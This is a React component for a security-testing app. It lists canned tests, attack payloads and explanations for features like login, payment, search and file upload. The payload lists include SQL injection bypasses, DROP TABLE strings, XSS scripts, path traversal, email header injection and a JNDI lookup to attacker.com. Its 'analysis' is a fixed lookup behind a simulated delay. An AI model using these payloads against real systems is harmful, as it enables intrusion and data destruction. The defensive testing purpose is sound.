'use client';

import { useState } from 'react';
import { FiShield, FiCheckSquare, FiSquare, FiSearch, FiUser, FiCreditCard, FiDatabase, FiLock, FiGlobe, FiSmartphone, FiMail, FiFileText, FiSettings, FiActivity } from 'react-icons/fi';

interface Feature {
  id: string;
  name: string;
  description: string;
  icon: React.ReactNode;
  category: string;
  tests: string[];
  payloads: string[];
  explanations: string[];
}

const allFeatures: Feature[] = [
  {
    id: 'login',
    name: 'Login/Authentication',
    description: 'User login and authentication system',
    icon: <FiLock className="text-red-500" />,
    category: 'Authentication',
    tests: [
      'Test SQL Injection in login fields',
      'Test brute force protection',
      'Test session fixation',
      'Test password strength requirements',
      'Test multi-factor authentication',
      'Test login rate limiting',
      'Test remember me functionality',
      'Test password reset flow'
    ],
    payloads: [
      "admin' OR '1'='1' --",
      "admin' OR 1=1#",
      "' OR '1'='1' --",
      "admin' AND 1=1 --",
      "' UNION SELECT null,username,password FROM users --",
      "admin'; DROP TABLE users; --"
    ],
    explanations: [
      'SQL Injection can bypass authentication by manipulating login queries',
      'Brute force attacks try many password combinations to gain access',
      'Session fixation allows attackers to hijack user sessions',
      'Weak passwords can be easily guessed or cracked',
      'MFA adds extra security layer beyond just password',
      'Rate limiting prevents automated attack attempts'
    ]
  },
  {
    id: 'registration',
    name: 'User Registration',
    description: 'New user account creation',
    icon: <FiUser className="text-red-500" />,
    category: 'Authentication',
    tests: [
      'Test input validation on registration fields',
      'Test email verification bypass',
      'Test duplicate account creation',
      'Test password confirmation bypass',
      'Test username enumeration',
      'Test registration rate limiting'
    ],
    payloads: [
      "<script>alert('XSS')</script>",
      "'; DROP TABLE users; --",
      "admin@example.com' --",
      "../../../etc/passwd",
      "user@example.com\n\nInjection",
      "' UNION SELECT * FROM admin --"
    ],
    explanations: [
      'Input validation prevents injection attacks in registration forms',
      'Email verification ensures user owns the email address',
      'Duplicate account checks prevent multiple registrations',
      'Username enumeration can reveal valid usernames',
      'Rate limiting prevents mass account creation'
    ]
  },
  {
    id: 'payment',
    name: 'Payment Processing',
    description: 'Credit card and payment handling',
    icon: <FiCreditCard className="text-red-500" />,
    category: 'Financial',
    tests: [
      'Test payment amount manipulation',
      'Test credit card validation bypass',
      'Test payment replay attacks',
      'Test insecure payment storage',
      'Test payment gateway integration',
      'Test currency conversion manipulation'
    ],
    payloads: [
      "amount=-100",
      "price=0.01&currency=USD",
      "card=4111111111111111&cvv=000",
      "amount=999999.99",
      "payment_id=reused_id_123",
      "callback_url=https://attacker.com/steal"
    ],
    explanations: [
      'Payment manipulation can lead to financial losses',
      'Credit card validation ensures valid card numbers',
      'Replay attacks can process same payment multiple times',
      'Insecure storage exposes sensitive payment data',
      'Payment gateway security is critical for transactions'
    ]
  },
  {
    id: 'api',
    name: 'API Endpoints',
    description: 'REST/GraphQL API endpoints',
    icon: <FiDatabase className="text-red-500" />,
    category: 'Backend',
    tests: [
      'Test API authentication bypass',
      'Test API rate limiting',
      'Test API parameter injection',
      'Test API version compatibility',
      'Test API CORS configuration',
      'Test API response data exposure'
    ],
    payloads: [
      "Authorization: Bearer null",
      "api_key=admin_key_here",
      "user_id=1&admin=true",
      "format=jsonp&callback=alert",
      "limit=999999&offset=0",
      "sort=username' UNION SELECT password FROM users --"
    ],
    explanations: [
      'API authentication prevents unauthorized access',
      'Rate limiting prevents API abuse and DoS',
      'Parameter injection can modify API behavior',
      'CORS misconfiguration can leak data',
      'Response exposure can reveal sensitive information'
    ]
  },
  {
    id: 'search',
    name: 'Search Functionality',
    description: 'Site search and filtering',
    icon: <FiSearch className="text-red-500" />,
    category: 'User Interface',
    tests: [
      'Test search query injection',
      'Test search result exposure',
      'Test search autocomplete security',
      'Test search filter bypass',
      'Test search result manipulation',
      'Test search log security'
    ],
    payloads: [
      "<script>alert('XSS')</script>",
      "'; DROP TABLE products; --",
      "*:*&debug=true",
      "q=*&sort=price' UNION SELECT * FROM users --",
      "query=${jndi:ldap://attacker.com/exploit}",
      "search=a&page=1&limit=999999"
    ],
    explanations: [
      'Search injection can access unauthorized data',
      'Autocomplete can expose sensitive information',
      'Search filters should validate all parameters',
      'Search logs should not expose sensitive queries',
      'Result manipulation can change displayed data'
    ]
  },
  {
    id: 'file_upload',
    name: 'File Upload',
    description: 'Document and image uploads',
    icon: <FiFileText className="text-red-500" />,
    category: 'File Handling',
    tests: [
      'Test file type validation',
      'Test file size limits',
      'Test malicious file upload',
      'Test file path traversal',
      'Test file execution prevention',
      'Test uploaded file access controls'
    ],
    payloads: [
      "shell.php.jpg",
      "../../../etc/passwd",
      "malicious.exe",
      "image.php%00.jpg",
      "shell.jsp.png",
      "malicious.pdf.exe"
    ],
    explanations: [
      'File validation prevents malicious uploads',
      'Size limits prevent storage exhaustion',
      'Malicious files can execute server-side code',
      'Path traversal can access system files',
      'Access controls prevent unauthorized file access'
    ]
  },
  {
    id: 'email',
    name: 'Email System',
    description: 'Email sending and notifications',
    icon: <FiMail className="text-red-500" />,
    category: 'Communication',
    tests: [
      'Test email header injection',
      'Test email spoofing',
      'Test mass email abuse',
      'Test email content injection',
      'Test email attachment security',
      'Test unsubscribe functionality'
    ],
 payloads: [
      "to=admin@site.com\nBcc:victim@site.com",
      "from=attacker@evil.com",
      "subject=<script>alert('XSS')</script>",
      "email=user@site.com%0d%0aCC:other@evil.com",
      "body='; DROP TABLE users; --",
      "template=../../../../etc/passwd"
    ],
    explanations: [
      'Email injection can add unauthorized recipients',
      'Email spoofing can send fake messages',
      'Mass email can be used for spam/abuse',
      'Content injection in emails can be malicious',
      'Attachment security prevents malware spread'
    ]
  },
  {
    id: 'admin_panel',
    name: 'Admin Panel',
    description: 'Administrative interface',
    icon: <FiSettings className="text-red-500" />,
    category: 'Administration',
    tests: [
      'Test admin authentication bypass',
      'Test privilege escalation',
      'Test admin action auditing',
      'Test sensitive data exposure',
      'Test admin session security',
      'Test admin functionality abuse'
    ],
    payloads: [
      "role=admin&user_id=123",
      "admin=true&action=delete",
      "access_level=999&user=attacker",
      "is_admin=1&bypass_check=true",
      "action=modify_config&key=security",
      "user_role=superadmin' --"
    ],
    explanations: [
      'Admin bypass gives attackers full control',
      'Privilege escalation elevates user permissions',
      'Admin auditing tracks all administrative actions',
      'Sensitive data exposure in admin panels is critical',
      'Admin sessions need enhanced security'
    ]
  },
  {
    id: 'mobile_api',
    name: 'Mobile API',
    description: 'Mobile app backend API',
    icon: <FiSmartphone className="text-red-500" />,
    category: 'Mobile',
    tests: [
      'Test mobile API authentication',
      'Test device fingerprinting',
      'Test mobile session management',
      'Test app version enforcement',
      'Test mobile-specific vulnerabilities',
      'Test push notification security'
    ],
    payloads: [
      "device_id=fake_device_123",
      "app_version=999.999.999",
      "platform=ios&jailbroken=true",
      "push_token=<script>alert(1)</script>",
      "mobile_key=compromised_key_here",
      "device_fingerprint=manipulated"
    ],
    explanations: [
      'Mobile API security is different from web',
      'Device fingerprinting prevents spoofing',
      'Mobile sessions need special handling',
      'App version enforcement prevents old vulnerabilities',
      'Push notifications can be intercepted'
    ]
  },
  {
    id: 'analytics',
    name: 'Analytics/Tracking',
    description: 'User behavior tracking',
    icon: <FiActivity className="text-red-500" />,
    category: 'Monitoring',
    tests: [
      'Test analytics data injection',
      'Test user privacy exposure',
      'Test tracking bypass',
      'Test analytics data integrity',
      'Test third-party script security',
      'Test data retention policies'
    ],
    payloads: [
      "event=<script>steal_cookies()</script>",
      "user_id=other_user_id_here",
      "page_url=https://evil.com/phishing",
      "referrer='; DROP TABLE analytics; --",
      "custom_data=<img src=x onerror=alert(1)>",
      "timestamp=9999999999"
    ],
    explanations: [
      'Analytics injection can execute scripts',
      'User privacy must be protected in tracking',
      'Tracking bypass defeats analytics',
      'Data integrity ensures accurate analytics',
      'Third-party scripts can be compromised'
    ]
  }
];

interface ComprehensiveFeatureSelectorProps {
  onFeaturesSelected: (features: string[]) => void;
  onAnalysisComplete: (result: {
    tests: string[];
    payloads: string[];
    explanations: string[];
  }) => void;
  setLoading: (loading: boolean) => void;
}

export default function ComprehensiveFeatureSelector({ 
  onFeaturesSelected, 
  onAnalysisComplete, 
  setLoading 
}: ComprehensiveFeatureSelectorProps) {
  const [selectedFeatures, setSelectedFeatures] = useState<string[]>([]);
  const [selectAll, setSelectAll] = useState(false);

  const toggleFeature = (featureId: string) => {
    setSelectedFeatures(prev => 
      prev.includes(featureId) 
        ? prev.filter(id => id !== featureId)
        : [...prev, featureId]
    );
  };

  const handleSelectAll = () => {
    if (selectAll) {
      setSelectedFeatures([]);
    } else {
      setSelectedFeatures(allFeatures.map(f => f.id));
    }
    setSelectAll(!selectAll);
  };

  const generateComprehensiveAnalysis = () => {
    setLoading(true);
    
    const allTests: string[] = [];
    const allPayloads: string[] = [];
    const allExplanations: string[] = [];

    selectedFeatures.forEach(featureId => {
      const feature = allFeatures.find(f => f.id === featureId);
      if (feature) {
        allTests.push(...feature.tests);
        allPayloads.push(...feature.payloads);
        allExplanations.push(...feature.explanations);
      }
    });

    // Simulate processing delay
    setTimeout(() => {
      onFeaturesSelected(selectedFeatures);
      onAnalysisComplete({
        tests: allTests,
        payloads: allPayloads,
        explanations: allExplanations
      });
      setLoading(false);
    }, 2000);
  };

  const categories = Array.from(new Set(allFeatures.map(f => f.category)));

  return (
    <div className="max-w-6xl mx-auto">
      <div className="relative bg-gradient-to-br from-purple-950/90 via-obsidian/80 to-red-900/70 backdrop-blur-md border border-purple-500/50 rounded-2xl p-8 shadow-2xl shadow-purple-500/50 shadow-red-500/30">
        <div className="flex items-center justify-between mb-6">
          <div className="flex items-center">
            <FiShield className="text-red-500 text-2xl mr-3" />
            <h3 className="text-xl font-bold text-white">Comprehensive Feature Selection</h3>
          </div>
          <button
            onClick={handleSelectAll}
            className="flex items-center space-x-2 px-4 py-2 bg-purple-600 hover:bg-purple-700 text-white rounded-lg transition-colors"
          >
            {selectAll ? <FiCheckSquare /> : <FiSquare />}
            <span>{selectAll ? 'Deselect All' : 'Select All'}</span>
          </button>
        </div>

        <p className="text-gray-400 mb-6">
          Select all features present in your web application for comprehensive security testing.
          This will generate detailed security checks for each selected feature.
        </p>

        {categories.map(category => (
          <div key={category} className="mb-8">
            <h4 className="text-lg font-semibold text-white mb-4 border-b border-purple-500/30 pb-2">
              {category}
            </h4>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              {allFeatures.filter(f => f.category === category).map(feature => (
                <div
                  key={feature.id}
                  onClick={() => toggleFeature(feature.id)}
                  className={`p-4 rounded-lg border cursor-pointer transition-all ${
                    selectedFeatures.includes(feature.id)
                      ? 'bg-purple-900/50 border-purple-500/50'
                      : 'bg-black/50 border-red-900/30 hover:bg-purple-900/30'
                  }`}
                >
                  <div className="flex items-start space-x-3">
                    <div className="mt-1">
                      {selectedFeatures.includes(feature.id) ? (
                        <FiCheckSquare className="text-green-400" />
                      ) : (
                        <FiSquare className="text-gray-400" />
                      )}
                    </div>
                    <div className="flex-1">
                      <div className="flex items-center mb-2">
                        {feature.icon}
                        <span className="ml-2 font-medium text-white">{feature.name}</span>
                      </div>
                      <p className="text-sm text-gray-400">{feature.description}</p>
                      <div className="mt-2 text-xs text-purple-400">
                        {feature.tests.length} tests, {feature.payloads.length} payloads
                      </div>
                    </div>
                  </div>
                </div>
              ))}
            </div>
          </div>
        ))}

        {selectedFeatures.length > 0 && (
          <div className="mt-8 p-6 bg-purple-950/50 rounded-lg border border-purple-500/30">
            <div className="flex items-center justify-between">
              <div>
                <h4 className="text-lg font-semibold text-white mb-2">
                  Comprehensive Analysis Ready
                </h4>
                <p className="text-gray-400 text-sm">
                  {selectedFeatures.length} features selected. 
                  This will generate {allFeatures.filter(f => selectedFeatures.includes(f.id)).reduce((acc, f) => acc + f.tests.length, 0)} tests, 
                  {allFeatures.filter(f => selectedFeatures.includes(f.id)).reduce((acc, f) => acc + f.payloads.length, 0)} payloads, and 
                  {allFeatures.filter(f => selectedFeatures.includes(f.id)).reduce((acc, f) => acc + f.explanations.length, 0)} explanations.
                </p>
              </div>
              <button
                onClick={generateComprehensiveAnalysis}
                className="px-6 py-3 bg-gradient-to-r from-red-600 to-red-700 hover:from-red-500 hover:to-red-600 text-white font-medium rounded-lg transition-all shadow-lg shadow-red-500/25"
              >
                Start Comprehensive Analysis
              </button>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
